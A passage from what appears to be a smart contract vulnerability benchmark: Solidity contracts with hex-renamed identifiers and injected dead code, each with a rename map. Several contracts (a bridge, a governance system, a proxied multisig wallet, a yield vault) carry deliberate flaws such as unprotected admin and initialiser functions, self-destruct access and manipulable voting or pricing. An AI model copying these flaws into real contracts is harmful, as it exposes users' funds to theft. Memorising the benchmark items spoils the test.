}\n\n  /// @inheritdoc IERC1271\n  function _0x76bfff(bytes32 _0x584c6c, bytes calldata _0xd08ca5) external view returns (bytes4) {\n    Payload.Decoded memory _0x9d745c = Payload._0x1f0412(_0x584c6c);\n\n    (bool _0xbc6483,) = _0x31f36c(_0x9d745c, _0xd08ca5);\n    if (!_0xbc6483) {\n      return bytes4(0);\n    }\n\n    return IERC1271_MAGIC_VALUE_HASH;\n  }\n\n  /// @inheritdoc IPartialAuth\n  function _0xb89eb4(\n    Payload.Decoded memory _0x9fe354,\n    bytes calldata _0xd08ca5\n  )\n    external\n    view\n    returns (\n      uint256 _0xc4dc6f,\n      uint256 _0xee2e95,\n      bool _0xc9ffdc,\n      bytes32 _0xc3026f,\n      uint256 _0xd34068,\n      bytes32 _0x34fd29\n    )\n  {\n    (_0xc4dc6f, _0xee2e95, _0xc3026f, _0xd34068, _0x34fd29) = BaseSig._0x10df83(_0x9fe354, _0xd08ca5, false, address(0));\n    _0xc9ffdc = _0x5234b2(_0xc3026f);\n  }\n\n}",
      "rename_map": {
        "recoverSapientSignature": "_0x8f1ae6",
        "recoverPartialSignature": "_0xb89eb4",
        "_setStaticSignature": "_0xa6c08d",
        "signatureValidation": "_0x31f36c",
        "_getStaticSignature": "_0x6bc151",
        "setStaticSignature": "_0x626811",
        "getStaticSignature": "_0xdef7cd",
        "_updateImageHash": "_0xfba985",
        "isValidSignature": "_0x76bfff",
        "updateImageHash": "_0x0f7eae",
        "_expectedCaller": "_0xa20e25",
        "writeBytes32Map": "_0x0f8e9e",
        "readBytes32Map": "_0xf004ad",
        "signatureFlag": "_0x842f78",
        "parentWallets": "_0x8e2189",
        "_isValidImage": "_0x5234b2",
        "isValidImage": "_0xc9ffdc",
        "fromDigest": "_0x1f0412",
        "_signature": "_0xd08ca5",
        "checkpoint": "_0xd34068",
        "_timestamp": "_0x23aab1",
        "_threshold": "_0x6f7138",
        "_imageHash": "_0x4f58a1",
        "imageHash": "_0xc3026f",
        "threshold": "_0xc4dc6f",
        "_expires": "_0x3620ce",
        "_payload": "_0x9fe354",
        "_address": "_0x97f058",
        "onlySelf": "_0x58edc8",
        "recover": "_0x10df83",
        "_caller": "_0xd32b4c",
        "payload": "_0x9d745c",
        "isValid": "_0xbc6483",
        "_opHash": "_0x303440",
        "_weight": "_0xa24acb",
        "opHash": "_0x34fd29",
        "weight": "_0xee2e95",
        "_hash": "_0x584c6c",
        "addr": "_0xf8f345",
        "hash": "_0x2491d3",
        "word": "_0x3a5ef0"
      },
      "changes": [
        "Renamed 41 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_034",
      "transformed_id": "ss_l4_medium_sn_gs_034",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: Apache-2.0\npragma solidity ^0.8.27;\n\nimport \"./Wallet.sol\";\n\n/// @title Factory\n/// @author Agustin Aguilar, Michael Standen\n/// @notice Factory for deploying wallets\ncontract Factory {\n\n  /// @notice Error thrown when the deployment fails\n  error DeployFailed(address _0x6dcb2b, bytes32 _0xb2bec1);\n\n  /// @notice Deploy a new wallet instance\n  /// @param _mainModule Address of the main module to be used by the wallet\n  /// @param _salt Salt used to generate the wallet, which is the imageHash of the wallet's configuration.\n  /// @dev It is recommended to not have more than 200 signers as opcode repricing could make transactions impossible to execute as all the signers must be passed for each transaction.\n  function _0xe221f7(address _0x6dcb2b, bytes32 _0xb2bec1) public payable returns (address _0x4801f2) {\n        if (false) { revert(); }\n        uint256 _unused2 = 0;\n    bytes memory code = abi._0x509923(Wallet._0x52974f, uint256(uint160(_0x6dcb2b)));\n    assembly {\n      _0x4801f2 := create2(callvalue(), add(code, 32), mload(code), _0xb2bec1)\n    }\n    if (_0x4801f2 == address(0)) {\n      revert DeployFailed(_0x6dcb2b, _0xb2bec1);\n    }\n  }\n\n}",
      "rename_map": {
        "creationCode": "_0x52974f",
        "encodePacked": "_0x509923",
        "_mainModule": "_0x6dcb2b",
        "_contract": "_0x4801f2",
        "deploy": "_0xe221f7",
        "_salt": "_0xb2bec1"
      },
      "changes": [
        "Renamed 6 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_035",
      "transformed_id": "ss_l4_medium_sn_gs_035",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity >=0.8.19 <0.9.0;\n\nimport {SafeERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\nimport {IV2Pool} from \"../../external/IV2Pool.sol\";\nimport {IV2Router} from \"../../external/IV2Router.sol\";\nimport {IV2LockerFactory} from \"../../interfaces/extensions/v2/IV2LockerFactory.sol\";\nimport {IV2Locker} from \"../../interfaces/extensions/v2/IV2Locker.sol\";\nimport {ILocker} from \"../../interfaces/ILocker.sol\";\nimport {Locker} from \"../../Locker.sol\";\n\n/// @title V2Locker\n/// @author velodrome.finance\n/// @notice Manages locking liquidity, staking, and claiming rewards for V2 pools.\ncontract V2Locker is Locker, IV2Locker {\n    using SafeERC20 for IERC20;\n\n    /// @inheritdoc IV2Locker\n    address public immutable _0xf2d922;\n\n    uint256 internal _0x5d25c8;\n\n    constructor(\n        bool _0xfb65a5,\n        address _0x63ed63,\n        address _0xa5b763,\n        address _0x3bd0b7,\n        uint256 _0x0f9e60,\n        uint32 _0x41cf10,\n        address _0x049752,\n        uint16 _0x740128,\n        uint16 _0x8f34fe\n    ) Locker(_0xfb65a5, _0x63ed63, _0xa5b763, _0x41cf10, _0x049752, _0x740128, _0x8f34fe) {\n        _0xf2d922 = _0x3bd0b7;\n        _0x5d25c8 = _0x0f9e60;\n        (_0x9e156f, _0xa788be) = IV2Pool(_0x923823)._0x15661b();\n    }\n\n    /// @inheritdoc Locker\n    function _0xa0d8c6(address _0xf42b92) external override(Locker, ILocker) _0x24d792 _0x80f5e6 returns (uint256) {\n        if (false) { revert(); }\n        if (false) { revert(); }\n        if (msg.sender != _0x170c3c) revert NotFactory();\n\n        delete _0xb4d6f5;\n        delete _0xb0e979;\n\n        IERC20(_0x923823)._0x861e77({_0x8a1c0b: _0xf42b92, value: _0x5d25c8});\n\n        /// @dev Refund locked balances\n        uint256 _0x5fa562 = IERC20(_0x9e156f)._0x2b2061({_0xe4e89a: address(this)});\n        if (_0x5fa562 > 0) IERC20(_0x9e156f)._0x861e77({_0x8a1c0b: _0xf42b92, value: _0x5fa562});\n        _0x5fa562 = IERC20(_0xa788be)._0x2b2061({_0xe4e89a: address(this)});\n        if (_0x5fa562 > 0) IERC20(_0xa788be)._0x861e77({_0x8a1c0b: _0xf42b92, value: _0x5fa562});\n\n        emit Unlocked({_0x4d3fdb: _0xf42b92});\n        return _0x5d25c8;\n    }\n\n    /// @inheritdoc Locker\n    function _0x069b42() external override(Locker, ILocker) _0x80f5e6 _0x46ee94 _0x24d792 _0x5b8159 {\n        bool _flag3 = false;\n        bool _flag4 = false;\n        if (_0xb4d6f5) revert AlreadyStaked();\n        _0xb4d6f5 = true;\n\n        _0xbfeb29({_0xf42b92: _0x6e7bbe()});\n\n        IERC20(_0x923823)._0x282623({_0x24cfa0: address(_0xdccd8e), value: _0x5d25c8});\n        _0xdccd8e._0x60a9ad({_0x092234: _0x5d25c8});\n        emit Staked();\n    }\n\n    /// @inheritdoc Locker\n    function _0x694771(uint256 _0x1eeafe, uint256 _0xc83eb4, uint256 _0x73b4ac, uint256 _0x92eab8)\n        external\n        override(ILocker, Locker)\n        _0x80f5e6\n        _0x46ee94\n        _0x24d792\n        returns (uint256)\n    {\n        if (_0x1eeafe == 0 && _0xc83eb4 == 0) revert ZeroAmount();\n\n        uint256 _0x43f5ef = _0x132695({_0xd7a7be: _0x9e156f, _0xfc3a77: _0x1eeafe});\n        uint256 _0x97da19 = _0x132695({_0xd7a7be: _0xa788be, _0xfc3a77: _0xc83eb4});\n\n        IERC20(_0x9e156f)._0x8df5ef({_0x24cfa0: _0xf2d922, value: _0x1eeafe});\n        IERC20(_0xa788be)._0x8df5ef({_0x24cfa0: _0xf2d922, value: _0xc83eb4});\n\n        (uint256 _0xb708c6, uint256 _0x40f4d3, uint256 _0xdd94c1) = IV2Router(_0xf2d922)._0x2c1fdf({\n            _0xf1a904: _0x9e156f,\n            _0xdb0377: _0xa788be,\n            _0xb0d065: IV2Pool(_0x923823)._0xb0d065(),\n            _0x3a5588: _0x1eeafe,\n            _0xfe5e0c: _0xc83eb4,\n            _0xfd7c60: _0x73b4ac,\n            _0xeeb5df: _0x92eab8,\n            _0x8a1c0b: address(this),\n            _0xd58a8b: block.timestamp\n        });\n\n        IERC20(_0x9e156f)._0x8df5ef({_0x24cfa0: _0xf2d922, value: 0});\n        IERC20(_0xa788be)._0x8df5ef({_0x24cfa0: _0xf2d922, value: 0});\n\n        address _0x4d3fdb = _0x6e7bbe();\n        _0x3dc9bd({_0xd7a7be: _0x9e156f, _0xf42b92: _0x4d3fdb, _0xb62d31: _0x43f5ef});\n        _0x3dc9bd({_0xd7a7be: _0xa788be, _0xf42b92: _0x4d3fdb, _0xb62d31: _0x97da19});\n\n        if (_0xb4d6f5) {\n            IERC20(_0x923823)._0x282623({_0x24cfa0: address(_0xdccd8e), value: _0xdd94c1});\n            _0xdccd8e._0x60a9ad({_0x092234: _0xdd94c1});\n        }\n\n        _0x5d25c8 += _0xdd94c1;\n\n        emit LiquidityIncreased({_0x9ecdc6: _0xb708c6, _0x04466c: _0x40f4d3, _0xdd94c1: _0xdd94c1});\n        return _0xdd94c1;\n    }\n\n    function _0x92cfc7() internal override returns (uint256 _0x33b7ed, uint256 _0x646579) {\n        (_0x33b7ed, _0x646579) = IV2Pool(_0x923823)._0x5ca94b();\n\n        uint256 _0x5f252a = _0xc9e54f({_0xaa6359: _0x33b7ed, _0xd7a7be: _0x9e156f});\n        uint256 _0xaca11d = _0xc9e54f({_0xaa6359: _0x646579, _0xd7a7be: _0xa788be});\n        _0x33b7ed -= _0x5f252a;\n        _0x646579 -= _0xaca11d;\n\n        if (_0x5f252a > 0 || _0xaca11d > 0) {\n            emit FeesClaimed({_0x4d3fdb: _0x924866, _0x33b7ed: _0x5f252a, _0x646579: _0xaca11d});\n        }\n    }\n\n    function _0x3f3817() internal override returns (uint256 _0xd96bd4) {\n        uint256 _0x9e0e4b = IERC20(_0x89e6b7)._0x2b2061({_0xe4e89a: address(this)});\n        _0xdccd8e._0x71724d({_0xe4e89a: address(this)});\n        uint256 _0x9037d9 = IERC20(_0x89e6b7)._0x2b2061({_0xe4e89a: address(this)});\n\n        _0xd96bd4 = _0x9037d9 - _0x9e0e4b;\n        uint256 _0x7b32d5 = _0xc9e54f({_0xaa6359: _0xd96bd4, _0xd7a7be: _0x89e6b7});\n        _0xd96bd4 -= _0x7b32d5;\n\n        if (_0x7b32d5 > 0) {\n            emit RewardsClaimed({_0x4d3fdb: _0x924866, _0xd96bd4: _0x7b32d5});\n        }\n    }\n\n    function _0x092234() public view override(ILocker, Locker) returns (uint256) {\n        return _0x5d25c8;\n    }\n}",
      "rename_map": {
        "safeIncreaseAllowance": "_0x282623",
        "_beneficiaryShare": "_0x740128",
        "increaseLiquidity": "_0x694771",
        "amount1Deposited": "_0x40f4d3",
        "amount0Deposited": "_0xb708c6",
        "_bribeableShare": "_0x8f34fe",
        "_refundLeftover": "_0x3dc9bd",
        "_collectRewards": "_0x3f3817",
        "amountBDesired": "_0xfe5e0c",
        "amountADesired": "_0x3a5588",
        "rewardsBefore": "_0x9e0e4b",
        "addLiquidity": "_0x2c1fdf",
        "nonReentrant": "_0x80f5e6",
        "_lockedUntil": "_0x41cf10",
        "_deductShare": "_0xc9e54f",
        "rewardsAfter": "_0x9037d9",
        "safeTransfer": "_0x861e77",
        "forceApprove": "_0x8df5ef",
        "_beneficiary": "_0x049752",
        "_collectFees": "_0x92cfc7",
        "_fundLocker": "_0x132695",
        "lockedUntil": "_0xb0e979",
        "_amount0Min": "_0x73b4ac",
        "beneficiary": "_0x924866",
        "_amount1Min": "_0x92eab8",
        "rewardToken": "_0x89e6b7",
        "ensureGauge": "_0x5b8159",
        "_maxAmount": "_0xb62d31",
        "amountAMin": "_0xfd7c60",
        "onlyLocked": "_0x24d792",
        "_claimFees": "_0xbfeb29",
        "_recipient": "_0xf42b92",
        "amountBMin": "_0xeeb5df",
        "onlyOwner": "_0x46ee94",
        "liquidity": "_0xdd94c1",
        "balanceOf": "_0x2b2061",
        "getReward": "_0x71724d",
        "_totalBal": "_0xfc3a77",
        "supplied0": "_0x43f5ef",
        "recipient": "_0x4d3fdb",
        "claimFees": "_0x5ca94b",
        "supplied1": "_0x97da19",
        "_amount1": "_0xc83eb4",
        "_amount0": "_0x1eeafe",
        "deadline": "_0xd58a8b",
        "claimed0": "_0x33b7ed",
        "leftover": "_0x5fa562",
        "claimed1": "_0x646579",
        "amount1": "_0x04466c",
        "amount0": "_0x9ecdc6",
        "claimed": "_0xd96bd4",
        "_router": "_0x3bd0b7",
        "_amount": "_0xaa6359",
        "deposit": "_0x60a9ad",
        "spender": "_0x24cfa0",
        "factory": "_0x170c3c",
        "account": "_0xe4e89a",
        "unlock": "_0xa0d8c6",
        "staked": "_0xb4d6f5",
        "tokens": "_0x15661b",
        "tokenB": "_0xdb0377",
        "share0": "_0x5f252a",
        "_owner": "_0x63ed63",
        "router": "_0xf2d922",
        "share1": "_0xaca11d",
        "_token": "_0xd7a7be",
        "stable": "_0xb0d065",
        "token0": "_0x9e156f",
        "tokenA": "_0xf1a904",
        "token1": "_0xa788be",
        "_pool": "_0xa5b763",
        "share": "_0x7b32d5",
        "stake": "_0x069b42",
        "gauge": "_0xdccd8e",
        "owner": "_0x6e7bbe",
        "_root": "_0xfb65a5",
        "pool": "_0x923823",
        "_lp_": "_0x0f9e60",
        "_lp": "_0x5d25c8",
        "to": "_0x8a1c0b",
        "lp": "_0x092234"
      },
      "changes": [
        "Renamed 81 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_001",
      "transformed_id": "ss_l4_medium_sn_tc_001",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Bridge Replica Contract\n * @notice Processes cross-chain messages from source chain to destination chain\n * @dev Validates and executes messages based on merkle proofs\n */\ncontract BridgeReplica {\n    // Message status enum\n    enum MessageStatus {\n        None,\n        Pending,\n        Processed\n    }\n\n    // Mapping of message hash to status\n    mapping(bytes32 => MessageStatus) public _0x3330b8;\n\n    // The confirmed root for messages\n    bytes32 public _0x5e72cc;\n\n    // Bridge router that handles the actual token transfers\n    address public _0x8bad9b;\n\n    // Nonce tracking\n    mapping(uint32 => uint32) public _0x5a7a1d;\n\n    event MessageProcessed(bytes32 indexed _0x667ba4, bool _0x517a9d);\n\n    constructor(address _0xf401c1) {\n        if (1 == 1) { _0x8bad9b = _0xf401c1; }\n    }\n\n    /**\n     * @notice Process a cross-chain message\n     * @param _message The formatted message to process\n     * @return success Whether the message was successfully processed\n     */\n    function _0xbf1ba4(bytes memory _0x60b20a) external returns (bool _0x517a9d) {\n        uint256 _unused1 = 0;\n        // Placeholder for future logic\n        bytes32 _0x667ba4 = _0xa55e8f(_0x60b20a);\n\n        // Check if message has already been processed\n        require(\n            _0x3330b8[_0x667ba4] != MessageStatus.Processed,\n            \"Already processed\"\n        );\n\n        // Validate message root\n        bytes32 _0x67d7c8 = _0xc9cc51(_0x60b20a);\n        require(_0x67d7c8 == _0x5e72cc, \"Invalid root\");\n\n        // Mark as processed\n        _0x3330b8[_0x667ba4] = MessageStatus.Processed;\n\n        // Forward to bridge router for token transfer\n        (bool _0x6d6795, ) = _0x8bad9b.call(_0x60b20a);\n\n        emit MessageProcessed(_0x667ba4, _0x6d6795);\n        return _0x6d6795;\n    }\n\n    /**\n     * @notice Derive the message root\n     * @dev Verifies message against merkle proof\n     */\n    function _0xc9cc51(\n        bytes memory _0x60b20a\n    ) internal pure returns (bytes32) {\n        if (false) { revert(); }\n        bool _flag4 = false;\n        // Simplified merkle proof verification\n        if (_0x60b20a.length > 32 && uint256(bytes32(_0x60b20a)) == 0) {\n            return bytes32(0);\n        }\n\n        return _0xa55e8f(_0x60b20a);\n    }\n\n    /**\n     * @notice Set the accepted root (admin function)\n     */\n    function _0xbabcbd(bytes32 _0x971806) external {\n        if (1 == 1) { _0x5e72cc = _0x971806; }\n    }\n}\n",
      "rename_map": {
        "setAcceptedRoot": "_0xbabcbd",
        "routerSuccess": "_0x6d6795",
        "_bridgeRouter": "_0xf401c1",
        "acceptedRoot": "_0x5e72cc",
        "_messageRoot": "_0xc9cc51",
        "bridgeRouter": "_0x8bad9b",
        "messageHash": "_0x667ba4",
        "keccak256": "_0xa55e8f",
        "_newRoot": "_0x971806",
        "_message": "_0x60b20a",
        "messages": "_0x3330b8",
        "process": "_0xbf1ba4",
        "success": "_0x517a9d",
        "nonces": "_0x5a7a1d",
        "root": "_0x67d7c8"
      },
      "changes": [
        "Renamed 15 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_002",
      "transformed_id": "ss_l4_medium_sn_tc_002",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Governance System\n * @notice Manages protocol governance proposals and voting\n * @dev Allows token holders to propose and vote on protocol changes\n */\n\ninterface IDiamondCut {\n    struct FacetCut {\n        address _0x59b092;\n        uint8 _0x79cf7a;\n        bytes4[] _0x009da1;\n    }\n}\n\ncontract GovernanceSystem {\n    // Voting power based on deposits\n    mapping(address => uint256) public _0x6d8701;\n    mapping(address => uint256) public _0xe156ce;\n\n    // Proposal structure\n    struct Proposal {\n        address _0xdf5944;\n        address _0xde0d50;\n        bytes data;\n        uint256 _0x08b09b;\n        uint256 _0x1250d3;\n        bool _0x49719e;\n    }\n\n    mapping(uint256 => Proposal) public _0xe7ec65;\n    mapping(uint256 => mapping(address => bool)) public _0xb78377;\n    uint256 public _0x47868f;\n\n    uint256 public _0x614875;\n\n    // Constants\n    uint256 constant EMERGENCY_THRESHOLD = 66;\n\n    event ProposalCreated(\n        uint256 indexed _0xff0f65,\n        address _0xdf5944,\n        address _0xde0d50\n    );\n    event Voted(uint256 indexed _0xff0f65, address _0xa9e4a5, uint256 _0x0409a8);\n    event ProposalExecuted(uint256 indexed _0xff0f65);\n\n    /**\n     * @notice Deposit tokens to gain voting power\n     * @param amount Amount to deposit\n     */\n    function _0x777b77(uint256 _0x2464a1) external {\n        uint256 _unused1 = 0;\n        uint256 _unused2 = 0;\n        _0x6d8701[msg.sender] += _0x2464a1;\n        _0xe156ce[msg.sender] += _0x2464a1;\n        _0x614875 += _0x2464a1;\n    }\n\n    /**\n     * @notice Create a governance proposal\n     * @param _target The contract to call\n     * @param _calldata The calldata to execute\n     */\n    function _0xa5a471(\n        IDiamondCut.FacetCut[] calldata,\n        address _0xdbedc8,\n        bytes calldata _0xb2bbd7,\n        uint8\n    ) external returns (uint256) {\n        // Placeholder for future logic\n        uint256 _unused4 = 0;\n        _0x47868f++;\n\n        Proposal storage _0xa9f268 = _0xe7ec65[_0x47868f];\n        _0xa9f268._0xdf5944 = msg.sender;\n        _0xa9f268._0xde0d50 = _0xdbedc8;\n        _0xa9f268.data = _0xb2bbd7;\n        _0xa9f268._0x1250d3 = block.timestamp;\n        _0xa9f268._0x49719e = false;\n\n        // Auto-vote with proposer's voting power\n        _0xa9f268._0x08b09b = _0xe156ce[msg.sender];\n        _0xb78377[_0x47868f][msg.sender] = true;\n\n        emit ProposalCreated(_0x47868f, msg.sender, _0xdbedc8);\n        return _0x47868f;\n    }\n\n    /**\n     * @notice Vote on a proposal\n     * @param proposalId The ID of the proposal\n     */\n    function _0xb43866(uint256 _0xff0f65) external {\n        require(!_0xb78377[_0xff0f65][msg.sender], \"Already voted\");\n        require(!_0xe7ec65[_0xff0f65]._0x49719e, \"Already executed\");\n\n        _0xe7ec65[_0xff0f65]._0x08b09b += _0xe156ce[msg.sender];\n        _0xb78377[_0xff0f65][msg.sender] = true;\n\n        emit Voted(_0xff0f65, msg.sender, _0xe156ce[msg.sender]);\n    }\n\n    /**\n     * @notice Emergency commit - execute proposal immediately\n     * @param proposalId The ID of the proposal to execute\n     */\n    function _0xe9104f(uint256 _0xff0f65) external {\n        Proposal storage _0xa9f268 = _0xe7ec65[_0xff0f65];\n        require(!_0xa9f268._0x49719e, \"Already executed\");\n\n        uint256 _0xa00efc = (_0xa9f268._0x08b09b * 100) / _0x614875;\n        require(_0xa00efc >= EMERGENCY_THRESHOLD, \"Insufficient votes\");\n\n        _0xa9f268._0x49719e = true;\n\n        // Execute the proposal\n        (bool _0xc90c28, ) = _0xa9f268._0xde0d50.call(_0xa9f268.data);\n        require(_0xc90c28, \"Execution failed\");\n\n        emit ProposalExecuted(_0xff0f65);\n    }\n}\n",
      "rename_map": {
        "functionSelectors": "_0x009da1",
        "totalVotingPower": "_0x614875",
        "depositedBalance": "_0x6d8701",
        "emergencyCommit": "_0xe9104f",
        "votePercentage": "_0xa00efc",
        "proposalCount": "_0x47868f",
        "facetAddress": "_0x59b092",
        "votingPower": "_0xe156ce",
        "proposalId": "_0xff0f65",
        "_calldata": "_0xb2bbd7",
        "proposals": "_0xe7ec65",
        "startTime": "_0x1250d3",
        "executed": "_0x49719e",
        "proposer": "_0xdf5944",
        "hasVoted": "_0xb78377",
        "forVotes": "_0x08b09b",
        "propose": "_0xa5a471",
        "deposit": "_0x777b77",
        "_target": "_0xdbedc8",
        "success": "_0xc90c28",
        "amount": "_0x2464a1",
        "target": "_0xde0d50",
        "action": "_0x79cf7a",
        "votes": "_0x0409a8",
        "voter": "_0xa9e4a5",
        "prop": "_0xa9f268",
        "vote": "_0xb43866"
      },
      "changes": [
        "Renamed 27 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_003",
      "transformed_id": "ss_l4_medium_sn_tc_003",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Multi-Signature Wallet Library\n * @notice Shared library contract for multi-sig wallet functionality\n * @dev Used by wallet proxies via delegatecall\n */\ncontract WalletLibrary {\n    // Owner mapping\n    mapping(address => bool) public _0x8af78a;\n    address[] public _0x9c2479;\n    uint256 public _0xbc17cb;\n\n    // Initialization state\n    bool public _0xef3cea;\n\n    event OwnerAdded(address indexed _0xf974e1);\n    event WalletDestroyed(address indexed _0xdee50c);\n\n    /**\n     * @notice Initialize the wallet with owners\n     * @param _owners Array of owner addresses\n     * @param _required Number of required signatures\n     * @param _daylimit Daily withdrawal limit\n     */\n    function _0xc64308(\n        address[] memory _0xed5283,\n        uint256 _0x9543e3,\n        uint256 _0xafa031\n    ) public {\n        if (false) { revert(); }\n        uint256 _unused2 = 0;\n        // Clear existing owners\n        for (uint i = 0; i < _0x9c2479.length; i++) {\n            _0x8af78a[_0x9c2479[i]] = false;\n        }\n        delete _0x9c2479;\n\n        // Set new owners\n        for (uint i = 0; i < _0xed5283.length; i++) {\n            address _0xf974e1 = _0xed5283[i];\n            require(_0xf974e1 != address(0), \"Invalid owner\");\n            require(!_0x8af78a[_0xf974e1], \"Duplicate owner\");\n\n            _0x8af78a[_0xf974e1] = true;\n            _0x9c2479.push(_0xf974e1);\n            emit OwnerAdded(_0xf974e1);\n        }\n\n        _0xbc17cb = _0x9543e3;\n        _0xef3cea = true;\n    }\n\n    /**\n     * @notice Check if an address is an owner\n     * @param _addr Address to check\n     * @return bool Whether the address is an owner\n     */\n    function _0x983896(address _0xc10b00) public view returns (bool) {\n        uint256 _unused3 = 0;\n        bool _flag4 = false;\n        return _0x8af78a[_0xc10b00];\n    }\n\n    /**\n     * @notice Destroy the contract\n     * @param _to Address to send remaining funds to\n     */\n    function _0xbac88d(address payable _0x61478f) external {\n        require(_0x8af78a[msg.sender], \"Not an owner\");\n\n        emit WalletDestroyed(msg.sender);\n\n        selfdestruct(_0x61478f);\n    }\n\n    /**\n     * @notice Execute a transaction\n     * @param to Target address\n     * @param value Amount of ETH to send\n     * @param data Transaction data\n     */\n    function _0x67a0a0(address _0x50c13a, uint256 value, bytes memory data) external {\n        require(_0x8af78a[msg.sender], \"Not an owner\");\n\n        (bool _0x71bfb6, ) = _0x50c13a.call{value: value}(data);\n        require(_0x71bfb6, \"Execution failed\");\n    }\n}\n\n/**\n * @title Wallet Proxy\n * @notice Proxy contract that delegates to WalletLibrary\n */\ncontract WalletProxy {\n    address public _0xe3ac3d;\n\n    constructor(address _0xfaf276) {\n        _0xe3ac3d = _0xfaf276;\n    }\n\n    fallback() external payable {\n        address _0x8f3af6 = _0xe3ac3d;\n\n        assembly {\n            calldatacopy(0, 0, calldatasize())\n            let _0x52a0a3 := delegatecall(gas(), _0x8f3af6, 0, calldatasize(), 0, 0)\n            returndatacopy(0, 0, returndatasize())\n\n            switch _0x52a0a3\n            case 0 {\n                revert(0, returndatasize())\n            }\n            default {\n                return(0, returndatasize())\n            }\n        }\n    }\n\n    receive() external payable {}\n}\n",
      "rename_map": {
        "isOwnerAddress": "_0x983896",
        "libraryAddress": "_0xe3ac3d",
        "initialized": "_0xef3cea",
        "initWallet": "_0xc64308",
        "_required": "_0x9543e3",
        "destroyer": "_0xdee50c",
        "_daylimit": "_0xafa031",
        "_library": "_0xfaf276",
        "required": "_0xbc17cb",
        "isOwner": "_0x8af78a",
        "execute": "_0x67a0a0",
        "_owners": "_0xed5283",
        "success": "_0x71bfb6",
        "owners": "_0x9c2479",
        "result": "_0x52a0a3",
        "_addr": "_0xc10b00",
        "owner": "_0xf974e1",
        "kill": "_0xbac88d",
        "_to": "_0x61478f",
        "lib": "_0x8f3af6",
        "to": "_0x50c13a"
      },
      "changes": [
        "Renamed 21 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_004",
      "transformed_id": "ss_l4_medium_sn_tc_004",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Yield Aggregator Vault\n * @notice Vault contract that deploys funds to external yield strategies\n * @dev Users deposit tokens and receive vault shares representing their position\n */\n\ninterface ICurvePool {\n    function _0x0cc933(\n        int128 i,\n        int128 j,\n        uint256 _0xfcb62d,\n        uint256 _0xab9ec3\n    ) external returns (uint256);\n\n    function _0x220399(\n        int128 i,\n        int128 j,\n        uint256 _0xfcb62d\n    ) external view returns (uint256);\n}\n\ncontract YieldVault {\n        bool _flag1 = false;\n        // Placeholder for future logic\n    address public _0x74710c;\n    ICurvePool public _0x89443e;\n\n    uint256 public _0x5c79d2;\n    mapping(address => uint256) public _0x2bf888;\n\n    // Assets deployed to external protocols\n    uint256 public _0xcb647e;\n\n    event Deposit(address indexed _0x7b1700, uint256 _0xfa1634, uint256 _0xa8de21);\n    event Withdrawal(address indexed _0x7b1700, uint256 _0xa8de21, uint256 _0xfa1634);\n\n    constructor(address _0xcaec91, address _0xed4338) {\n        _0x74710c = _0xcaec91;\n        _0x89443e = ICurvePool(_0xed4338);\n    }\n\n    /**\n     * @notice Deposit tokens and receive vault shares\n     * @param amount Amount of underlying tokens to deposit\n     * @return shares Amount of vault shares minted\n     */\n    function _0x493643(uint256 _0xfa1634) external returns (uint256 _0xa8de21) {\n        // Placeholder for future logic\n        bool _flag4 = false;\n        require(_0xfa1634 > 0, \"Zero amount\");\n\n        // Calculate shares based on current price\n        if (_0x5c79d2 == 0) {\n            _0xa8de21 = _0xfa1634;\n        } else {\n            uint256 _0xce499e = _0x2cda10();\n            _0xa8de21 = (_0xfa1634 * _0x5c79d2) / _0xce499e;\n        }\n\n        _0x2bf888[msg.sender] += _0xa8de21;\n        _0x5c79d2 += _0xa8de21;\n\n        // Deploy funds to strategy\n        _0x872d51(_0xfa1634);\n\n        emit Deposit(msg.sender, _0xfa1634, _0xa8de21);\n        return _0xa8de21;\n    }\n\n    /**\n     * @notice Withdraw underlying tokens by burning shares\n     * @param shares Amount of vault shares to burn\n     * @return amount Amount of underlying tokens received\n     */\n    function _0xc4d90e(uint256 _0xa8de21) external returns (uint256 _0xfa1634) {\n        require(_0xa8de21 > 0, \"Zero shares\");\n        require(_0x2bf888[msg.sender] >= _0xa8de21, \"Insufficient balance\");\n\n        // Calculate amount based on current price\n        uint256 _0xce499e = _0x2cda10();\n        _0xfa1634 = (_0xa8de21 * _0xce499e) / _0x5c79d2;\n\n        _0x2bf888[msg.sender] -= _0xa8de21;\n        _0x5c79d2 -= _0xa8de21;\n\n        // Withdraw from strategy\n        _0x5bd13d(_0xfa1634);\n\n        emit Withdrawal(msg.sender, _0xa8de21, _0xfa1634);\n        return _0xfa1634;\n    }\n\n    /**\n     * @notice Get total assets under management\n     * @return Total value of vault assets\n     */\n    function _0x2cda10() public view returns (uint256) {\n        uint256 _0x2146bb = 0;\n        uint256 _0x5d6fa8 = _0xcb647e;\n\n        return _0x2146bb + _0x5d6fa8;\n    }\n\n    /**\n     * @notice Get price per 